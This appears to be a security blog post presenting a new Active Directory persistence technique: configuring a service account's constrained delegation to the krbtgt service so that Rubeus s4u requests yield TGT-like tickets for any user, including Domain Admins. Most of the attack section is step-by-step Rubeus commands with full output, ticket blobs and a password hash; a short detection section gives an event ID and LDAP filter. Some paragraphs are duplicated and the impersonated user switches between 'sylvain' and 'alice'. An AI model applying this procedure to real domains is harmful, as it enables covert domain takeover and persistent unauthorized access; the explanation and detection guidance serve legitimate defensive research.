---
title: "Delegate to KRBTGT service"
date: 2022-01-20T09:22:42+02:00
Summary: Delegate to KRBTGT service to forge any TGT
---

If you compromise an Active Directory environment and get Domain Administrator privileges, there are a million and one ways to persist in a domain. This article will describe a new one, allowing to create valid TGT (i.e. *have a master key*). This technique relies on a Service Account with a *Constrained Delegation* to the `KRBTGT` service.

The main appeal of this technique is that it does not require to be joined to the domain, contrarily to **[DCSync](https://stealthbits.com/blog/what-is-dcsync-an-introduction/)** or **[Golden Tickets](https://en.hackndo.com/kerberos-silver-golden-tickets/)** attacks: Only network access to **LDAP** and **Kerberos** ports is enough!

But first, to explain the attack in details, we need to review some few Kerberos concepts.

# What are a TGT and TGS?


- TGT, which stands for *Ticket Granting Ticket*, is used by Kerberos services to authenticate a user or a computer. To get a TGT you need to prove your identity, and once you get one, you can ask for a ticket to access the different services.



- A TGS, which stands for *Ticket Granting Service*, is used to ask for access to any kind of service using Kerberos, such as remote desktop, CIFS, LDAP etc…


The important thing to know here is that requesting a TGT or TGS are very similar. TGT is only a TGS for a krbtgt/DOMAIN service. Keep this detail in mind!

# What is a Golden Ticket?

We will not go deeper regarding golden ticket, but if you want to learn more about that, I recommend you to read [this article from hackndo](https://en.hackndo.com/kerberos-silver-golden-tickets/) .

To forge a golden ticket you need to have the krbtgt service account hash. To do that you have to memory access of the KDC, which is commonly hosted on a domain controller. Once you get this hash, you can create by hand a valid TGT and fill the PAC information with the privileges wanted.

As this attack needs access to the domain controller, attackers prefers to focus on service accounts with delegation privileges.

# What is Delegation?

As for Kerberos Tickets, I will not deep dive into this topic, because [It is well explained by Harmjoy himself here](http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/).

The interesting point here is how the constrained delegation with protocol transition works. If you can compromise an account with such a privilege, you can forge a TGS for anybody, including high privilege users, that targets the services list present in the field `msDS-AllowedToDelegateTo`. This attack uses a Kerberos extension named s4u and s4uProxy (Self for User).

Attackers focus generally on targeting LDAP services, because if you compromise a service account with the LDAP SPN of any DC present into the `msDS-AllowedToDelegateTo`, you can perform a *DCSync* attack. 

# Changing msDS-AllowedToDelegateTo

Recent vulnerabilities as [CVE-2021-34470](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34470), [CVE-2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287), [CVE-2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278) remember us that any non-privileged user can create a machine account easily due to the value of `ms-DS-MachineAccountQuota` set to 10 by default. It means that, out of installation, any user of a domain can join up to 10 machines in the domain. 
[Powermad](https://github.com/Kevin-Robertson/Powermad) project gives useful scripts to make the exploitation's experience pleasant.
The project [Powermad](https://github.com/Kevin-Robertson/Powermad) gives useful scripts to make the exploitation's experience pleasant.

Yet, even though attribute `msDS-AllowedToDelegateTo` is writeable only by users present in `CN=Administrators,CN=Builtin,DC=cosmos,DC=local` group or `CN=Account Operators,CN=Builtin,DC=cosmos,DC=local` group, 
it is not a sufficient condition: As *[Clement Notin](https://twitter.com/cnotin?ref_src=twsrc%5Egoogle%7Ctwcamp%5Eserp%7Ctwgr%5Eauthor)* confirmed me, you also need the `SeEnableDelegationPrivilege` privilege on the Domain Controller. 
And this privilege is set by the “*Default Domain Controller*” GPO :
it is not a sufficient condition: As *Clement Notin* taught me, you also need the `SeEnableDelegationPrivilege` privilege on the Domain Controller. 
And this privilege is set by the “*Default Domain Controller*” GPO :

```
SeEnableDelegationPrivilege = *S-1-5-32-544
```

In other words, this privilege is only available for members of `CN=Administrators,CN=Builtin,DC=cosmos,DC=local`. [Harmj0y](https://twitter.com/harmj0y?lang=en) explains how to backdoor it using write access to [GPO](https://www.harmj0y.net/blog/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/).

# What do we want to do?

We want, with enough privilege, to create a TGT for any users (privileged or not).

The two known attacks are:
- **Golden Ticket**, but you need to perform a connection on a DC to steal the krbtgt secret
- **DCSync**, but you have to be connected to a workstation joined to the domain, and set a specific SPN which is usually monitored 

Both attacks needs to be connected to a resource of the domain and we don't want that.

Now remember our first remark at the beginning of this article :

> The important thing to know here is that requesting a TGT or TGS are very similar because requesting a TGT is only a TGS for the krbtgt/DOMAIN service.

We saw that if we have enough privileges, we can control the field `msDS-AllowedToDelegateTo` of a service account.

Now if we set `krbtgt/COSMOS` as value, what will happens?

# Let's Backdoor !

The attack will consist into :
1. Detect a service account with constrained delegation and protocol transition
1. **Set value `krbtgt/DOMAIN` to the field `msDS-AllowedToDelegateTo` of the service account**, that's the innovative part 🆕 !
1. Ask a TGT for the service account
1. Perform a `s4u` request (Self, and proxy) to impersonate a target user against the delegated service, here `krbtgt`

In the following example, the service account is `SA-TEST-01` and the privileged user is `sylvain`.

## Getting Service Account

We have two options, create one or compromised one.

We have LDAP to the rescue. We can create and configure a Service account using any LDAP tools, like for the oldest one, `ldp.exe`.
But it can be noisy to create a service account

## Set msDS-AllowedToDelegateTo to krbtgt service

Legitimate administration tools like “*Users and Computers*” can not set a SPN to `krbtgt/DOMAIN` directly. However, it works using ldp over LDAP:

**![|624x341](/images/c358ad8130662869e9f9aef19e9d1c10baf7a3e9.png)**

In the screenshot, we set the service account with a target SPN value of `krbtgt/COSMOS`.

Now, let's use [Rubeus](https://github.com/GhostPack/Rubeus) to create a TGT for any user, without knowing anything about the secret of the target user.

## Ask TGT for SA-TEST-01

First of all, we will ask a TGT for the service account, the only secret we need is the hash or password of this service account:

```text
c:\work\dev\Rubeus\Rubeus\bin\Debug>Rubeus.exe asktgt /user:SA-TEST-01 /domain:COSMOS /dc:127.0.0.1 /password:test /outfile:sa_tgt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.1

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 0CB6948805F797BF2A82807973B89537
[*] Building AS-REQ (w/ preauth) for: 'COSMOS\SA-TEST-01'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFFjCCBRKgAwIBBaEDAgEWooIEMTCCBC1hggQpMIIEJaADAgEFoQ0bC0NPU01PUy5DT1JQohswGaAD
      AgECoRIwEBsGa3JidGd0GwZDT1NNT1OjggPwMIID7KADAgESoQMCAQ2iggPeBIID2kbsUIKBiGUzKwwW
      G/HP93teI1C7w9mjUHNJKBpTQUtDNFsEdsevhGVOOUKFIqcyYB4YKnXV2KpX6wASqYeGMMHjMPjU93qX
      aVBX3nE/fHF0Tk0PfMWoumYVTUzS7KdR6BuS0POPwRIPWMsiD/VSPtr6/eNABXhyzb44KtC9IUbSMfVj
      +PU4ot6+MzFL6yN72KianUKXrdMUD/OL8c1DQJ90uR1+NXwbcczipnKz0cG+Wihjz1Tc6HhXLbxk9UKC
      PBgDexhsorYuwnPB3yh6tIedMMnQci9Z3+zLJOuqHdkmHDS7H2YJh0sINP+8jkZJTPFM3qwzAmB02FAk
      d8H/VUMGA/T8PZG4L/99FDH+Ma4LsPJEqRz1jbZ/91mgMrrqB7cALaryZNx91aterncKpR3KDmuKuc0S
      ywFWyEx5W9Cye5v6EieY7VCC4XA/AfFW3Eb+tYVKm6mlAohhBSJVBonkPJ/G6zXTTx9iQAchqPo/TnTo
      4Vle3oj+LyqrAJurP3qH5wRKIwxoFrCoJLA1z9NBSo/5eDFAXEA/ivc5uuZ/R9E+Md3lDNuCZ2wcZEKH
      tZFZPpzDeE/wIoqFeQC5dPUiZ/HXqGUbWxQ4B5M9JxegHBKrw3ER2K0QnHskQcAnUTU2Gg5QFKRqahyL
      zChHpTVQ0yiDsXX5YcbQEesXmkVcLpqC4uOdXxJZ1RwyV+66dN68A2HuomZsn13oXtgaGBHPXS+GyzJm
      P7hpeM0kUzGgtCuAgTRwGQI7JdeCvlOoaHQfMpKY8Dk8GZslyDohqyPk4DURnoCAEEhgIJnidfRVd06k
      9lofIGVViXVivahj/eGGo9SE+AAzKe2RJK75gKOXQ50dFl89ImsKcJPDNPdi2B3x+ecEoiB48VsjSJZR
      j5pVFgf9JEOPFQLMH/H6rPNBbXiAvX1mX6ZnXlMZTG8X5dC3/YEVy2AfmRBeDVxZIM5ZhTGrlk3fJlNz
      e7EXzUaldrOCvgNb+SP8cD7AfJTscVhT5bSxqml+aNnKzBbGM1CwXa+aK+USSvOF0EMWqDFtPyXFYq43
      6f0QyBVcd5/ZmUL3PA94218nUt6doelZJNpCEzSI0irX7kU7S4K8y99+zazXYYX/lNK1Y1DdYVNc2UVN
      QfiwAOpkOwl9ndGnyp6/7rrU18Jj7UoPhdFophLpBloeOkCq90QlDSk4vCocJ/FlkRbrhr2COo4S8yda
      pyiR20dJUkha5X0O/cOkg+qwXWlChmKhS/314NGFDRET4dO3RSfzRL+BPTFIw5uy8GQ3vMxJUM/KYCb5
      WC1jOhuQeAUbxAUPYomdo4HQMIHNoAMCAQCigcUEgcJ9gb8wgbyggbkwgbYwgbOgGzAZoAMCARehEgQQ
      mWV/ylf0p1ebFQGQ7B+/lqENGwtDT1NNT1MuQ09SUKIXMBWgAwIBAaEOMAwbClNBLVRFU1QtMDGjBwMF
      AEDhAAClERgPMjAyMjAxMDcxNDI2MzBaphEYDzIwMjIwMTA4MDAyNjMwWqcRGA8yMDIyMDExNDE0MjYz
      MFqoDRsLQ09TTU9TLkNPUlCpGzAZoAMCAQKhEjAQGwZrcmJ0Z3QbBkNPU01PUw==

[*] Ticket written to sa_tgt


  ServiceName              :  krbtgt/COSMOS
  ServiceRealm             :  COSMOS.CORP
  UserName                 :  SA-TEST-01
  UserRealm                :  COSMOS.CORP
  StartTime                :  1/7/2022 3:26:30 PM
  EndTime                  :  1/8/2022 1:26:30 AM
  RenewTill                :  1/14/2022 3:26:30 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  mWV/ylf0p1ebFQGQ7B+/lg==
  ASREP (key)              :  0CB6948805F797BF2A82807973B89537
```

## s4u impersonate sylvain on krbtgt service

Then we will perform a `s4u` attack by asking to impersonate a privileged account (here alice is *Domain Admin*).

```
c:\work\dev\Rubeus\Rubeus\bin\Debug>Rubeus.exe s4u /msdsspn:krbtgt/COSMOS /domain:COSMOS /dc=127.0.0.1 /impersonateuser:sylvain /ticket:sa_tgt /outfile:sylvain

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.1

[*] Action: S4U

[*] Action: S4U

[*] Using domain controller: 127.0.0.1
[*] Building S4U2self request for: 'SA-TEST-01@COSMOS.CORP'
[*] Sending S4U2self request
[+] S4U2self success!
[*] Got a TGS for 'sylvain' to 'SA-TEST-01@COSMOS.CORP'
[*] base64(ticket.kirbi):

      doIFJDCCBSCgAwIBBaEDAgEWooIERjCCBEJhggQ+MIIEOqADAgEFoQ0bC0NPU01PUy5DT1JQohcwFaAD
      AgEBoQ4wDBsKU0EtVEVTVC0wMaOCBAkwggQFoAMCARehAwIBA6KCA/cEggPzms/db1gH4LE4b/ppQBLh
      4B7GcbhGp109Bo+4jO4PWlZF+Lzm6c4N4eilq2q+pspu83CKJrQSWcsdodvebTCrWhBYmByBldWJjSK1
      c3061agmpc8EZ0p6Xbqu4G/ZqQpWzKTRolOrPby/uR/6j4gtEInDxrrA2yy2wddiownu+ti9AGw2eFii
      h4TXb+1bDnWUAVKB6ePHSjGbEBiuNHvhEx4bgKmwkJOKImWf4iXRqMbRy207h4eRsN6S/t8q04r3YpIG
      NOIGiHO1F7lwr7m/kfMqEktHW5Xs3mzvBHUn9hp9hwlc3KerO10FRZhdK/UcDL6pxBna/meWEM1TK9z/
      onLVJhi/5rlCaQzwlnTFGRxNnFnIQbmINWgYCotJ09wwbjl+KNqoTtXrvKngPpEroO4noIwCbD0Xj/Cb
      EAtrbG3niO7yfmHYlMUVXVXG7aAl6ygfqtp/maY9+BuC3N9kL1bPqAnyi7s0AVueLzJRZyjzSrZ1pL+X
      KQAKlSfcPT0e1IIAYtUOehUluhpKMu62zA8kJRS0RV1tttid1/BnZ+hsRIMarpmwLkGjwe0bdFIYc/AX
      6ks6If0VknpsKGRK2yQfBerGnMu6rJvC6BD0qCgU6U1EYHu/E4HttNDc4etuKXvAx28jm0+RuMWm4tmt
      3NlXTAeMyjzzRrQrdh9bzAi/DCILF06/g6RCrbViP9eqo5aUUyGE8d59RW/KY9I2Nw86yPciguWOb7tp
      hXVd0jmPIyLD9BK6Oizq8KBrI67VQ7K82jCBwhR/y9VOssGCWuOwv2lBwoPu3GW4e9nBWb/jJ7RaCzyH
      hMRTxMhUVRm2SqZ7xsoWD+HGpz5JKOWkC5yZ1jJzW3uhCNt4/SxAJbKoJJVur6uGdn33opruz2umgkMr
      nTsdQHm853WJjUduz8ZGMXqypOEBW0vySR7EP+vTPiblc7akHqNY7T5wghU+7yUHlpJ224piffnmpruP
      tp5O5uvJogfmiO/chwkNdttm7+ISqu8b4ATBo6GJPDuVT3RGNuDqUG6kP73RovGY2CY7zW8bpcihsh6V
      SsvTiwc9tjpue8KGdUbULTLmLuQA2N23h+ptoI39prdopBTqYK6CNdeeRlqFMI/Vlh/mAI3h+KH6zJwm
      XrmO0I5Xj/5+YuG62cZyNkET9x4ECmBkTCNxlwgDpxTuSPlrtnHB+SjdiZ3Y8mm0AIQkBDuehNqy5HID
      s22e3AVdLIKbOxr34RgCaOpwabukSjerdvEdCgt+iDSD91Q1Cn4uCqYxJMF1OjqPPUFO8gPyEWWm8XLC
      p2H/kjf2TgeCMNncDacGw5hrMug74b22YVdDJdNDnac8UAYMo4HJMIHGoAMCAQCigb4Egbt9gbgwgbWg
      gbIwga8wgaygGzAZoAMCARehEgQQGI1VSYNbK/ijwqlbthXBraENGwtDT1NNT1MuQ09SUKIUMBKgAwIB
      CqELMAkbB3N5bHZhaW6jBwMFAEChAAClERgPMjAyMjAxMDcxNDM3MzNaphEYDzIwMjIwMTA4MDAyNjMw
      WqcRGA8yMDIyMDExNDE0MjYzMFqoDRsLQ09TTU9TLkNPUlCpFzAVoAMCAQGhDjAMGwpTQS1URVNULTAx


[*] Ticket written to sylvain_sylvain_to_SA-TEST-01@COSMOS.CORP

[*] Impersonating user 'sylvain' to target SPN 'krbtgt/COSMOS'
[*] Using domain controller: 127.0.0.1
[*] Building S4U2proxy request for service: 'krbtgt/COSMOS'
[*] Sending S4U2proxy request
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'krbtgt/COSMOS':

      doIFzDCCBcigAwIBBaEDAgEWooIE6jCCBOZhggTiMIIE3qADAgEFoQ0bC0NPU01PUy5DT1JQohswGaAD
      AgECoRIwEBsGa3JidGd0GwZDT1NNT1OjggSpMIIEpaADAgEXoQMCAQ2iggSXBIIEk/qeoVkQOmVohbiA
      BtYDcBNZ1FjK0ptLzS5uX8i+/svoU18E4kIOSHHoDPPrDI5L7zMB+mLEfi9tXxoWs9PhvlhCD/8xDL8v
      jxrdUPfF3YxlRt1F6d7H15a5xVfaqz9L95NZ+dBD53u4Fk/0M4C7BYlD+krWyvYVT5G3S8BivZBeZbbS
      oOFMV7YlFbVKzbaNl8JH9KrTY0TXjZeOrLKJruLgP0+nhCWfWeSh4d21lyxH+OoHOch+5/mpBS4DBPGp
      /ZVt9ccyf8N1+acIjfll6zr0wOW4MJtCI4scakG1c4uDASHF7IK0x5gjoJk+W4pNC9P3VJF2tSQrPE4b
      RleyxY+suyIh0Xfv0p1d879ay71ETJxtTQi7xbMx5XM7kmB85zdAmAK20X8FygjzgIBiTIY6HUZKvFw4
      C2tM9T0VkyXCe/BCMaijBPyO/lLKi/bEcQovnng2lUXALmiBeqHNXmt59wnXsqa3qCuq97Q6aTONDwsU
      NTaoegJUa7uWVVitR6dl2W4gTmckW4GLB1g1FQVhjwgDEJHJ18s20B8Wdewq4+qMYDrd6P3rmDfQJsKH
      ayRajc3MLXNrw3Y0Tn5X8BVIr5Qb3/n62a0BR8oBwbY9l9nlVNENrLBqD48LPHlL9qvqT7v+eyPgiTTo
      2oqU7v5yjNfOul8PfCIi3zP1RIl/MXZNCm+IL6AVeaCdkWEVmBDfv/Z1Xo26RNBLx24hnJvCiwuVkJcg
      7bk64QOTO7uui+ojiU+hv9zIIjoSwa5ak0x0rkClLGIQUTB7mirobt9Z8qsRPTGZcydpvvQrYcPEQRa+
      zHM40jDL2MmphlG7bblXgM1nffbUeOcAZQADKd02QPq32O3HVkJ3o5BYt34Oy/6bwr16n7FFDYLRSHge
      ntYsvZ/+D3CzvIk5UEh/2867AMwRzggl27SK1fTjzmbPTqIJeXIPedWuBA2FAiylZJBxemUZfoBOEy/e
      BTQ8UYvTD1EMJX53vtPOaaSlMpecTWf7iX8zYmA+WoMZJOE4WJf7GPaO2SS/CfqvSoJxHO63yrWetNpj
      SAHd/D+zQzcwjmWwqUkwPtPpbFjREC3X83/IPSs5NsSd/jmZz5vTZ+T8lbeanFmOCIXWW3zcwyFVrDJh
      h4i40ogU2OvSjyyfWAFM8DSO+EWX/m8UFw7+wG9OekB6E6hM6nY0zglwAPR2brIbLjMglfwn4OQDROur
      yZzNFMLv7IIc886HHjfmiFc8q+bKjmrTiUXqthC8kYfRxhfDEEhk/7pTLKBw2vFflhJtjyYiRmCNmeXE
      cdtXvrGJW2+BrHUfd1awoW28VSih44wqgtGLwhQzvIFHCWcFLIqhTvMCJSRl6k8CWnOwtcHFYzSj86On
      x2M7xfW7MuiI4y1nUfc9qjj1GA6P7a1wr7ZoZFwOfH5p3C2Gu8W+dncv1m1Os6MJ+lnHLnhqCEtfTEaH
      DmK7bgqx3yt9hmwoavaSTKH3WDirF615sKTHYfcCyT2I2ae8fXJ/coWiROJaUDzvjsz+3QeAnPiRIUQL
      We85isvtqlJ09BBxNJH4VT5Wejqjgc0wgcqgAwIBAKKBwgSBv32BvDCBuaCBtjCBszCBsKAbMBmgAwIB
      F6ESBBBn0BC2x8Qdjgk8UItLuM5RoQ0bC0NPU01PUy5DT1JQohQwEqADAgEKoQswCRsHc3lsdmFpbqMH
      AwUAQKEAAKURGA8yMDIyMDEwNzE0MzczM1qmERgPMjAyMjAxMDgwMDI2MzBapxEYDzIwMjIwMTE0MTQy
      NjMwWqgNGwtDT1NNT1MuQ09SUKkbMBmgAwIBAqESMBAbBmtyYnRndBsGQ09TTU9T

[*] Ticket written to sylvain_krbtgt_COSMOS
```

Here `Rubeus` ask for `S4uSelf` ticket for himself (SA-TEST-01) and then ask a TGS for `alice` for the service `krbtgt` (actually it's a TGT!)

## Asking a TGS for any service now using the TGS(T) received from s4u

Finally, we can ask a TGS for a sensible service using the ticket get from `s4u` that impersonate a high privilege user, and can act as a TGT!

```
c:\work\dev\Rubeus\Rubeus\bin\Debug>Rubeus.exe asktgs /ticket:alice_krbtgt_COSMOS /domain:COSMOS /dc:127.0.0.1 /service:cifs/WIN-P8AJE4ISDL7

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.1

[*] Action: Ask TGS

[*] Using domain controller: 127.0.0.1
[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'cifs/WIN-P8AJE4ISDL7'
[+] TGS request successful!
[*] base64(ticket.kirbi):

      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

  ServiceName              :  cifs/WIN-P8AJE4ISDL7
  ServiceRealm             :  COSMOS.CORP
  UserName                 :  sylvain
  UserRealm                :  COSMOS.CORP
  StartTime                :  1/7/2022 3:38:40 PM
  EndTime                  :  1/8/2022 1:26:30 AM
  RenewTill                :  1/14/2022 3:26:30 PM
  Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  euuUjdxXsl/gVUH7pUp5ovSCi2HN2qg17009XJ8TR/I=
```

We are now Domain Admin without knowing anything about it, and it works for any users!

Keep in mind this wisdom from harmj0y:
>  There are a million ways to backdoor Active Directory given sufficient rights (make that a million and one : )

We can say +1 !

# How to detect it?

To detect it, we can rely on event id `4738`, **A user account was changed**, and monitoring the attribute value of ` AllowedToDelegateTo=*krbtgt*`:

**![](27e822f7e14e40a6ef8e4dc223698a16b942df1ba88d5c4306ea48920f36c383)**

Or by using ldap with the following filter:

```
(&(userAccountControl:1.2.840.113556.1.4.803:=16777216)(msDS-AllowedToDelegateTo=krbtgt*)!(objectClass=computer))
```

# Conclusion

We have configured a service account to allow constrained delegation with protocol transition, to target the `krbtgt` service.
By using the `s4u` kerberos extension, we can forge a TGT for any user, just by knowing the secret of the controlled service.
On the contrary of attacks like **DCSync** or **Golden Tickets**, we don't have to be connected to a machine to install the backdoor, but we still need high privilege.

Don't forget, every service accounts on your domain could be a potential backdoor and have to be treated like the `krbtgt` service.

Thanks Clement Notin (@cnotin) for his help :pray:

# Links

https://en.hackndo.com/kerberos-silver-golden-tickets/
http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/
https://github.com/Kevin-Robertson/Powermad
https://www.harmj0y.net/blog/activedirectory/the-most-dangerous-user-right-you-probably-have-ever-heard-of/
